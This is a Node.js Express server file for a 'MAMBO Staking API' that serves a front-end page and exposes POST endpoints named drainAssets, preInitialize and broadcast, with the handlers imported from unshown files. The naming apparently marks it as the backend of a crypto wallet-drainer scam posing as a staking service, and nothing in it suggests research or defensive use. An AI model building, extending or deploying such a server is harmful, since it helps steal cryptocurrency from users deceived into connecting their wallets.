import express from 'express';
import 'dotenv/config';
import drainAssetsHandler from './drainAssets.js';
import preInitializeHandler from './preInitialize.js';
import broadcastHandler from './broadcast.js';

const app = express();

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// CORS headers
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    message: 'MAMBO Staking API is running',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// API routes
app.post('/api/drainAssets', drainAssetsHandler);
app.post('/api/preInitialize', preInitializeHandler);
app.post('/api/broadcast', broadcastHandler);

// Catch-all route for API endpoints
app.all('/api/*', (req, res) => {
  res.status(404).json({
    success: false,
    message: 'API endpoint not found',
    availableEndpoints: [
      '/api/health',
      '/api/drainAssets',
      '/api/preInitialize',
      '/api/broadcast'
    ]
  });
});

// Serve static files from public directory
app.use(express.static('public'));

// Serve the main application
app.get('*', (req, res) => {
  res.sendFile('public/index.html', { root: '.' });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('[ERROR]', err);
  res.status(500).json({
    success: false,
    message: 'Internal server error',
    error: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// For local development
if (process.env.NODE_ENV !== 'production') {
  const PORT = process.env.PORT || 3002;
  app.listen(PORT, () => {
    console.log(`🚀 MAMBO Staking Server running on port ${PORT}`);
    console.log(`📱 Frontend: http://localhost:${PORT}`);
    console.log(`🔗 API: http://localhost:${PORT}/api`);
  });
}

// Export for Vercel
export default app;
